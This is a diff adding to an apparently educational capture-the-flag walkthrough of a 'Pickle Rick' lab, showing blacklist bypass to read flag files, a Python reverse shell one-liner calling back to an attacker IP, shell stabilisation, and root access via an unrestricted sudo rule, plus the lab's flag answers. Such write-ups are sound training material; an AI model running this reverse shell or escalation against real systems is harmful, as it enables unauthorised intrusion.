@@ -192,3 +192,100 @@ perl -ne 'print' file.txt
 The restriction was implemented using a basic blacklist approach, which only blocked specific command names. This type of filtering is ineffective, as it can be bypassed using alternative binaries, command obfuscation, or scripting techniques.
 
 This demonstrates a common security misconfiguration in command injection scenarios.
+
+## reading files 
+
+### Command Used
+```bash
+grep . file.txt
+```
+```ansi
+grep . clue.txt
+
+Look around the file system for the other ingredient.
+
+grep . Sup3rS3cretPickl3Ingred.txt
+
+mr. meeseek hair
+```
+- Found First Ingredient
+
+## Getting Reverse Shell because Python3 is avaiable 
+
+### Reverse Shell Code 
+```bash
+python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("192.168.137.158",9001));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
+```
+
+### Start Listening
+```bash
+nc -nvlp 9001
+```
+##  Initial Shell (www-data / low privilege user)
+
+## Upgrading Shell to Stable shell 
+
+### Commands Used 
+```ansi
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+Ctrl + Z
+stty raw -echo; fg
+
+export TERM=xterm
+stty rows 40 columns 120
+```
+## Post-Exploitation Enumeration 
+```ansi
+www-data@ip-10-49-150-68:/var/www/html$ cd /home
+www-data@ip-10-49-150-68:/home$ ls
+rick  ubuntu
+www-data@ip-10-49-150-68:/home$ cd rick
+www-data@ip-10-49-150-68:/home/rick$ ls
+'second ingredients'
+www-data@ip-10-49-150-68:/home/rick$ cat second\ ingredients 
+1 jerry tear
+```
+- Found Second Ingrediant
+
+## Privilege Escalation 
+
+### Command used 
+```bash
+sudo -l
+```
+### Output
+```ansi
+www-data@ip-10-48-185-215:/var/www/html$ sudo -l
+Matching Defaults entries for www-data on ip-10-48-185-215:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on ip-10-48-185-215:
+    (ALL) NOPASSWD: ALL
+```
+### 🧠 Analysis
+
+The user `www-data` is allowed to execute all commands as root without requiring a password. This is a critical misconfiguration, as it effectively grants full administrative access to the system.
+
+## Exploitation 
+
+### Command used 
+```bash
+sudo su
+```
+### Found Root shell
+```ansi
+www-data@ip-10-48-185-215:/var/www/html$ sudo su
+root@ip-10-48-185-215:/var/www/html# whoami
+root
+```
+### Read the final ingredient
+```ansi
+root@ip-10-48-185-215:/var/www/html# cd /root
+root@ip-10-48-185-215:~# ls
+3rd.txt  snap
+root@ip-10-48-185-215:~# cat 3rd.txt
+3rd ingredients: fleeb juice
+```
+- Found the Final Ingredient : fleeb juice
+
+# Thanks for Reading | Creator @Zeref0xD
